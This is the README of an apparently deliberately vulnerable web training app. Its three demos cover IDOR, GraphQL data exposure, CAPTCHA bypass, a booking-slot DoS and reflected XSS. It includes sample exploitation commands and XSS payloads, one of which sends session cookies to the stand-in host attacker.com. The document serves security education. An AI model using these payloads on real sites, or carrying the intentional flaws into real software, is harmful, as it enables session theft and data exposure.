# demo-framework

> **WARNING: EDUCATIONAL USE ONLY**: This application contains intentional security vulnerabilities for educational and training purposes. DO NOT deploy to production environments.

A comprehensive web application framework designed to demonstrate common web application security vulnerabilities in a controlled environment. Perfect for security training, penetration testing practice, and educational purposes.

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Quick Start](#quick-start)
- [Demo Applications](#demo-applications)
- [Security Vulnerabilities](#security-vulnerabilities)
- [Installation](#installation)
- [Usage](#usage)
- [API Documentation](#api-documentation)
- [Architecture](#architecture)
- [Educational Resources](#educational-resources)
- [Contributing](#contributing)
- [Security Disclaimer](#security-disclaimer)
- [License](#license)

## Overview

This security demonstration framework provides three realistic web applications, each containing specific types of vulnerabilities commonly found in real-world applications. Each demo includes both a vulnerable application and comprehensive documentation explaining the vulnerabilities and how to exploit them.

### Key Features

- **Realistic Applications**: Full-featured web apps that demonstrate real-world scenarios
- **Comprehensive Documentation**: Detailed security analysis and exploitation guides with table of contents navigation
- **Multiple Vulnerability Types**: IDOR, XSS, GraphQL issues, DoS attacks, and more
- **Educational Focus**: Designed specifically for learning and training
- **Modern Dark Theme**: Clean, responsive interface using Bootstrap with Catppuccin Mocha color scheme
- **Interactive Attack Demos**: Live demonstration of DoS attacks and other vulnerabilities
- **Server Simulation**: Randomized web server headers (Apache, Nginx, IIS, Express)

## Recent Updates

### New Features Added
- **🎨 Catppuccin Mocha Theme**: Complete UI redesign with modern dark theme using Catppuccin Mocha color palette
- **📋 Table of Contents**: Enhanced documentation pages with interactive table of contents navigation for better user experience
- **💥 DoS Attack Demo**: Live demonstration of appointment booking denial-of-service attacks in AutoFinder (`/demo1/dos-attack`)
- **⚡ Interactive Attack Interface**: Real-time attack execution with progress tracking and detailed result analysis
- **🔧 Enhanced Documentation**: Improved security documentation with better organization and visual styling

## Quick Start

```bash
# Clone the repository
git clone <repository-url>
cd demo-framework

# Install dependencies
npm install

# Start the application
node index.js

# Open your browser
open http://localhost:3000
```

## Demo Applications

### 1. AutoFinder - Car Search Platform
**Vulnerabilities**: IDOR, User Enumeration, HTML Injection, DoS Attacks

A car search and marketplace application where users can search for vehicles and save searches.

- **Demo URL**: `/demo1`
- **Documentation**: `/demo1/docs`
- **DoS Attack Demo**: `/demo1/dos-attack`
- **Key Features**: 
  - Car search with filters
  - User session management
  - Saved search functionality
  - Email notifications
  - Interactive appointment booking DoS attack demonstration

**Primary Vulnerabilities:**
- Insecure Direct Object References (IDOR)
- User ID enumeration through API endpoints
- HTML injection in email notifications
- Missing authorization checks
- **NEW**: Appointment booking DoS attack (monopolize all time slots)

### 2. ShopTracker - Order Tracking System
**Vulnerabilities**: GraphQL IDOR, CAPTCHA Bypass, Information Disclosure

An e-commerce order tracking system with GraphQL API integration.

- **Demo URL**: `/demo2`
- **Documentation**: `/demo2/docs`
- **Key Features**:
  - Order lookup functionality
  - GraphQL API endpoint
  - CAPTCHA protection (bypassable)
  - Customer information display

**Primary Vulnerabilities:**
- GraphQL-based IDOR attacks
- Partial zip code bypass
- CAPTCHA validation bypass
- Sensitive customer data exposure

### 3. XSS Demo - Greeting Application
**Vulnerabilities**: Reflected XSS, Cookie Exposure

A simple greeting application that demonstrates cross-site scripting vulnerabilities.

- **Demo URL**: `/demo3`
- **Documentation**: `/demo3/docs`
- **Key Features**:
  - Personalized greeting generation
  - URL parameter support
  - Session cookie management

**Primary Vulnerabilities:**
- Reflected Cross-Site Scripting (XSS)
- Unsafe template rendering
- Admin session cookie exposure
- No input validation or sanitization

## Security Vulnerabilities

### Vulnerability Matrix

| Demo | Vulnerability Type | Severity | OWASP Top 10 | Impact |
|------|-------------------|----------|--------------|---------|
| AutoFinder | IDOR | Critical | A01 (Access Control) | Data breach, unauthorized access |
| AutoFinder | User Enumeration | High | A01 (Access Control) | Information disclosure |
| AutoFinder | HTML Injection | Medium | A03 (Injection) | Phishing, defacement |
| **AutoFinder** | **DoS Attack** | **Critical** | **A04 (Insecure Design)** | **Service disruption, revenue loss** |
| ShopTracker | GraphQL IDOR | Critical | A01 (Access Control) | Customer data exposure |
| ShopTracker | Auth Bypass | High | A07 (Auth Failures) | Unauthorized access |
| ShopTracker | Info Disclosure | Critical | A01 (Access Control) | PII/payment data leak |
| XSS Demo | Reflected XSS | High | A03 (Injection) | Session hijacking, malware |
| XSS Demo | Cookie Exposure | Medium | A05 (Security Config) | Session theft |

### Common Attack Vectors

1. **API Enumeration**: Testing sequential IDs and parameters
2. **Input Injection**: Testing for XSS, HTML injection, and other injection attacks
3. **Authentication Bypass**: Exploiting weak validation logic
4. **Session Management**: Attacking session handling and cookie security
5. **Information Disclosure**: Extracting sensitive data through API responses
6. **Denial of Service**: Monopolizing system resources through appointment booking attacks

## Installation

### Prerequisites

- **Node.js** (v14 or higher)
- **npm** (v6 or higher)
- **Modern web browser** (Chrome, Firefox, Safari, Edge)

### Detailed Installation Steps

1. **Clone the Repository**
   ```bash
   git clone <repository-url>
   cd demo-framework
   ```

2. **Install Dependencies**
   ```bash
   npm install
   ```

3. **Verify Installation**
   ```bash
   node --version  # Should be v14+
   npm --version   # Should be v6+
   ```

4. **Start the Application**
   ```bash
   node index.js
   ```

5. **Access the Application**
   - Open your browser to `http://localhost:3000`
   - You should see the main demo selection page

### Docker Installation (Optional)

```dockerfile
# Create a Dockerfile
FROM node:16-alpine
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 3000
CMD ["node", "index.js"]
```

```bash
# Build and run with Docker
docker build -t demo-framework .
docker run -p 3000:3000 demo-framework
```

## Usage

### For Security Training

1. **Start with Documentation**: Read the security documentation for each demo
2. **Understand the Vulnerabilities**: Review the vulnerability explanations and impact
3. **Practice Exploitation**: Follow the step-by-step exploitation guides
4. **Test Different Payloads**: Experiment with various attack vectors
5. **Learn Mitigation**: Study the recommended fixes and secure coding practices

### For Penetration Testing Practice

1. **Reconnaissance**: Explore the applications to understand functionality
2. **Vulnerability Discovery**: Use manual and automated testing techniques
3. **Exploitation**: Develop and test proof-of-concept exploits
4. **Documentation**: Practice writing vulnerability reports
5. **Remediation**: Understand how to fix the identified issues

### Sample Exploitation Workflows

#### AutoFinder IDOR Exploitation
```bash
# 1. Create a saved search to get a search ID
curl -X POST "http://localhost:3000/demo1/search" \
  -H "Content-Type: application/json" \
  -d '{"make":"Toyota","saveName":"My Search"}'

# 2. Enumerate other users' searches
curl "http://localhost:3000/api/saved-searches/1"
curl "http://localhost:3000/api/saved-searches/2"
curl "http://localhost:3000/api/saved-searches/3"
```

#### ShopTracker GraphQL Exploitation
```bash
# GraphQL query to access any order
curl -X POST "http://localhost:3000/api/platform/sales" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ order(number: \"R500160602\", zipcode: \"44\", guestToken: \"\") { email firstName lastName phone address1 lastFour } }"
  }'
```

#### XSS Demo Exploitation
```
# Basic XSS payload
<script>alert('XSS')</script>

# Cookie theft payload
<script>new Image().src='http://attacker.com/steal.php?c='+document.cookie</script>

# URL-based attack
http://localhost:3000/demo3?name=<script>alert('XSS')</script>
```

## API Documentation

### AutoFinder APIs

#### Search Cars
- **Endpoint**: `POST /demo1/search`
- **Purpose**: Search for cars and optionally save searches
- **Vulnerable**: Yes (User enumeration, HTML injection)

```json
{
  "make": "Toyota",
  "minPrice": 15000,
  "maxPrice": 30000,
  "zipCode": "44333",
  "saveName": "My Search"
}
```

#### Get Saved Search (VULNERABLE)
- **Endpoint**: `GET /api/saved-searches/:searchId`
- **Purpose**: Retrieve saved search details
- **Vulnerability**: IDOR - No authorization check

#### Get Customer Info (VULNERABLE)
- **Endpoint**: `GET /sell-my-car/api/customer/:userId`
- **Purpose**: Retrieve customer profile
- **Vulnerability**: User enumeration

### ShopTracker APIs

#### GraphQL Order Lookup (VULNERABLE)
- **Endpoint**: `POST /api/platform/sales`
- **Purpose**: Look up order details
- **Vulnerabilities**: IDOR, partial validation, CAPTCHA bypass

```graphql
{
  order(number: "R500160602", zipcode: "44", guestToken: "") {
    email
    firstName
    lastName
    phone
    address1
    lastFour
    items {
      name
      price
      quantity
    }
  }
}
```

## Architecture

### Technology Stack

- **Backend**: Node.js with Express.js
- **Templating**: EJS (Embedded JavaScript)
- **Styling**: Bootstrap 5 with Catppuccin Mocha dark theme
- **Icons**: Bootstrap Icons
- **Database**: In-memory storage (for demo purposes)
- **GraphQL**: graphql and graphql-http libraries

### Project Structure

```
demo-framework/
├── index.js                 # Main application server
├── package.json            # Dependencies and scripts
├── routes/                 # Demo applications
│   ├── demo1/             # AutoFinder
│   │   ├── demo1.js       # Routes and business logic
│   │   ├── index.ejs      # Vulnerable application UI
│   │   ├── docs.ejs       # Security documentation
│   │   ├── demo1.pdf      # Additional documentation
│   │   └── demo1.docx     # Additional documentation
│   ├── demo2/             # ShopTracker
│   │   ├── demo2.js       # Routes and GraphQL logic
│   │   ├── index.ejs      # Vulnerable application UI
│   │   ├── docs.ejs       # Security documentation
│   │   ├── demo2.pdf      # Additional documentation
│   │   └── demo2.docx     # Additional documentation
│   └── demo3/             # XSS Demo
│       ├── demo3.js       # Routes and logic
│       ├── index.ejs      # Vulnerable application UI
│       ├── docs.ejs       # Security documentation
│       ├── demo3.pdf      # Additional documentation
│       └── demo3.docx     # Additional documentation
├── README.md              # This file
└── CLAUDE.md              # Claude Code instructions (gitignored)
```

### Security Architecture (Intentionally Flawed)

The application intentionally implements several anti-patterns:

1. **No Input Validation**: User input is not sanitized or validated
2. **Missing Authorization**: APIs don't verify user permissions
3. **Unsafe Templating**: Uses unescaped EJS rendering
4. **Weak Session Management**: Predictable session tokens
5. **Information Disclosure**: Verbose error messages and data exposure
6. **No Rate Limiting**: APIs are not protected against enumeration
7. **Insecure GraphQL**: No query complexity limits or authorization

## Educational Resources

### Learning Objectives

After completing these demos, users should understand:

1. **IDOR Attacks**: How to identify and exploit insecure direct object references
2. **XSS Vulnerabilities**: Different types of XSS and exploitation techniques  
3. **GraphQL Security**: Common GraphQL vulnerabilities and attack vectors
4. **API Security**: Best practices for securing REST and GraphQL APIs
5. **Input Validation**: Importance of proper input sanitization
6. **Authorization**: Implementing proper access controls

### Recommended Learning Path

1. **Beginner**: Start with XSS Demo → AutoFinder → ShopTracker
2. **Intermediate**: Focus on API testing and automation
3. **Advanced**: Develop custom exploits and payloads

### Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [GraphQL Security](https://owasp.org/www-project-graphql-security/)
- [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## Contributing

We welcome contributions that enhance the educational value of this framework!

### Contribution Guidelines

1. **New Vulnerabilities**: Add new demo applications showcasing different vulnerability types
2. **Documentation**: Improve existing documentation or add new educational content
3. **Bug Fixes**: Fix issues that prevent proper demonstration of vulnerabilities
4. **UI Improvements**: Enhance the user interface and experience

### Development Setup

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/new-demo`
3. Make your changes
4. Test thoroughly
5. Submit a pull request

### Code Standards

- Follow existing code style and structure
- Include comprehensive documentation for new vulnerabilities
- Ensure all demos maintain the educational focus
- Add appropriate security warnings

## Security Disclaimer

### Important Warnings

- **DO NOT DEPLOY TO PRODUCTION**: This application contains intentional vulnerabilities
- **LOCAL USE ONLY**: Only run in controlled, isolated environments
- **EDUCATIONAL PURPOSE**: Designed for learning and training only
- **NO WARRANTY**: No security guarantees provided

### Responsible Use

- Use only for authorized security testing and education
- Do not attack systems you don't own or have permission to test
- Respect applicable laws and regulations
- Report any unintended vulnerabilities responsibly

### Legal Notice

This software is provided for educational purposes only. Users are responsible for complying with all applicable laws and regulations. The authors assume no liability for misuse of this software.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## Quick Reference

### Starting the Application
```bash
node index.js
# Access at http://localhost:3000
```

### Demo URLs
- **Main Dashboard**: `http://localhost:3000`
- **AutoFinder**: `http://localhost:3000/demo1`
- **ShopTracker**: `http://localhost:3000/demo2`
- **XSS Demo**: `http://localhost:3000/demo3`

### Documentation URLs
- **AutoFinder Docs**: `http://localhost:3000/demo1/docs`
- **ShopTracker Docs**: `http://localhost:3000/demo2/docs`
- **XSS Demo Docs**: `http://localhost:3000/demo3/docs`

### Attack Demonstration URLs
- **AutoFinder DoS Attack Demo**: `http://localhost:3000/demo1/dos-attack`

### Sample Test Data
- **Order Numbers**: R500160602, R500160603, R500160604
- **Zip Codes**: 44333, 10001, 90210
- **XSS Payloads**: `<script>alert('XSS')</script>`, `<img src=x onerror=alert(1)>`

---

**Happy Learning!**

*Remember: The best defense is understanding the attack.*